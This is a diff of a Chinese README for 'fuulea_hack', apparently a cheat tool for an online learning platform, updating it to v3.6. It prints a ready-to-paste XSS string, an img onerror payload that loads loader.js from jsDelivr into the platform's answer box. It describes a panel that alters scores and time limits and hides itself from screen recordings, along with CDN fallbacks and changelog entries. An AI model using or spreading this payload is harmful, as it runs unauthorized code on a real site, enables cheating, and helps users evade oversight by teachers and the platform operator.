@@ -7,7 +7,7 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.5/loader.js'">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.6/loader.js'">
 ```
 
 154 字符，输入框没有长度限制，直接粘贴即可。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
@@ -22,11 +22,22 @@
 
 > 首次注入时 loader 会把自身源码存进 `localStorage.fhL`，并记下版本号 `fhV`；版本一变就自己重新抓一份。
 >
-> **不用手记版本号**：面板 → 工具 → 🧪 环境自检，顶部有「🔄 查最新版并复制」，会自动查 jsDelivr / GitLab 上的最新标签、验证 CDN 可用、把注入串塞进剪贴板，同时刷新本机缓存。默认每次打开自检就自动跑一次，可在那一行关掉。
+> **不用手记版本号**：面板 → 工具 → 🔄 版本更新（v3.6 新增），点「查询最新版」会自动查 jsDelivr / GitHub 上的最新标签、验证 CDN 可用，并给出两种注入串（纯注入串 / 带「版本vX.Y」前缀）一键复制，还能顺手刷新本机缓存。原来的 🧪 环境自检里也保留着同样的能力。
 >
 > 为什么不用 GitLab `/-/raw/`：它返回 `text/plain` + `nosniff`，`<script>` 标签拒执行。jsDelivr 走 GitHub 并给正确的 JS MIME，所以当主源。
 >
 > `cdn.jsdelivr.net` 在国内常被重置，所以注入串默认用 `fastly.jsdelivr.net`；loader 自身与模块加载会按 `cdn` → `fastly` → `gcore` → raw.githubusercontent → GitLab API 依次重试。
+
+## v3.6
+
+- **AI 对话与聊天室支持 Markdown + LaTeX**：AI 回答（流式结束后）与聊天室消息会渲染标题、粗斜体、删除线、行内码 / 代码块、列表、引用、分割线、表格和 http(s) 链接；`$...$` / `\(...\)` 行内公式与 `$$...$$` / `\[...\]` 块级公式会按需懒加载 KaTeX（fastly → cdn 镜像，失败自动回退原文）。用户的提问气泡仍按纯文本显示。
+- **聊天室也能全屏**：聊天室标题栏新增 ⛶，与 AI 网页头栏的全屏按钮状态同步；Esc 先退全屏再关窗口。
+- **去掉重复的「最大化」**：AI 网页只保留自带的 ⛶ 全屏，不再额外注入 loader 的小窗 / 全屏按钮；全屏时会清掉拖动留下的内联尺寸，不再被浮动窗口的宽高卡住。
+- **主面板最小化后可以点回来了**：迷你态只留猫头和关闭按钮，整颗胶囊可点展开（原来剩下的图标把它挤出可视区，猫头被裁掉，导致怎么点都还原不了）。
+- **工具页新增 🔄 版本更新**：显示当前 / 最新版本与校验来源，点一下就能复制注入串——可选「纯注入串」或「版本v3.6 + 注入串」；还能把最新 loader.js 写进本机缓存。不自动注入。
+- **聊天室昵称固定用登录用户名**：删掉单独的自定义昵称输入；未登录时输入框禁用并提示先登录，未保存上传 Token 时提示先去 🔑。
+- **上传 / 恢复配置改用私有仓库** `https://gitlab.com/yq-group2/fuulea_ai_repository`：项目路径已做 URL 编码；新设备恢复时先输入有读权限的 Token（`read_api` 即可），校验通过后再输 PIN。Token 无写权限时上传会明确提示需要 Developer / Maintainer 及以上。
+- 版本号 `TAG` / AI 头栏 / 主面板标签统一升到 3.6。
 
 ## v3.5
 
@@ -94,8 +105,9 @@
 | 🤖 AI 网页 | `mods/ai.js` | 全屏、密钥掩码、网页相机拍照 / 相册、多会话、Chat/Responses、模型扫描、探测缓存；多图输入（≤9 张）+ 图片缩放 |
 | 💬 聊天室（共享） | `mods/ai.js` | 主面板 chat 组入口，直接开聊天室；消息写 GitLab `message/`，30 秒轮询 + 本机缓存 |
 | 👤 账号 | `loader.js` | 用户名 + PIN 登录（本机持久）；AI Key / Token / 网页配置按账号保存 |
-| ⬆ 上传配置 | `loader.js` | 本机 `fh:*` 配置加密上传到 `config/<id>.json`（除 API Key / 会话 / 缓存）；PIN 自动生成并保存在本机 |
-| ⬇ 更新配置 | `loader.js` | 本机有 PIN 时静默恢复，换设备才输入 PIN，从云端解密取回配置 |
+| ⬆ 上传配置 | `loader.js` | 本机 `fh:*` 配置加密上传到私有仓库 `yq-group2/fuulea_ai_repository` 的 `config/<id>.json`（除 API Key / 会话 / 缓存）；PIN 自动生成并保存在本机 |
+| ⬇ 更新配置 | `loader.js` | 本机有 PIN 时静默恢复，换设备先输入读权限 Token 再输 PIN |
+| 🔄 版本更新 | `mods/update.js` | 查最新版本、校验 CDN、复制纯注入串或「版本vX.Y + 注入串」、刷新本机缓存 |
 | ◐ 透明度 | `loader.js` | 主面板与模块窗口 5%–100%，标题栏保持可操作 |
 | 💰 积分 | `mods/score.js` | 设 `score` + `earned`（两个一起改才生效） |
 | 🐾 灵宠 | `mods/pets.js` | 数量（≤4）、种类（fox/qilin/cat/dog）、名字 |
@@ -130,7 +142,8 @@
 - 配置 ID 与 PIN 无关：重置 PIN 不改文件名，旧 PIN 立即失效。
 - `box.keys` 只收 `fh:*`（主题、透明度、网页站点、便签、解除限时标记、AI 地址/模型/思考深度等）；排除 API Key、会话、聊天记录、聊天室缓存、指令历史、`fh:mod:*` 源码缓存、`fh:cfg:*` 自身（含本机 PIN `fh:cfg:pin` / `fh:cfg:pinAt`）。
 - v3.5 起 PIN 由插件生成并保存在本机：上传时若有 Token 就直接用本地 PIN 重写配置，成功页展示一次可复制的 PIN；恢复时先试本机 PIN，失败才弹输入框（换设备 / 清缓存）。每次上传都会换新盐和新的 `wrapPin`，旧 PIN 立即失效。
-- 恢复流程：`pullConfig` → 有本机 PIN 直接 `cfgPull(pin)`，否则输入 PIN → 列出 `config/` → 逐个试解 `wrapPin` → 命中即解 `box` → 写回 localStorage（含 `fh:ai:gitToken`）并 `cfgPinSet(pin)`。
+- 恢复流程：`pullConfig` → 没有读权限 Token 时先弹 Token（校验 `read_api`）→ 有本机 PIN 直接 `cfgPull(pin)`，否则输入 PIN → 列出 `config/` → 逐个试解 `wrapPin` → 命中即解 `box` → 写回 localStorage（含 `fh:ai:gitToken`）并 `cfgPinSet(pin)`。
+- v3.6 起仓库是私有的（`yq-group2/fuulea_ai_repository`）：上传需要 Developer 及以上的写权限，读取（恢复 / 启动探测）需要 `read_api`。只用于读配置的 Token 存在本机 `fh:cfg:rTok`，恢复成功后会被备份里的真 Token 覆盖并清掉。
 
 ## 存档结构
 
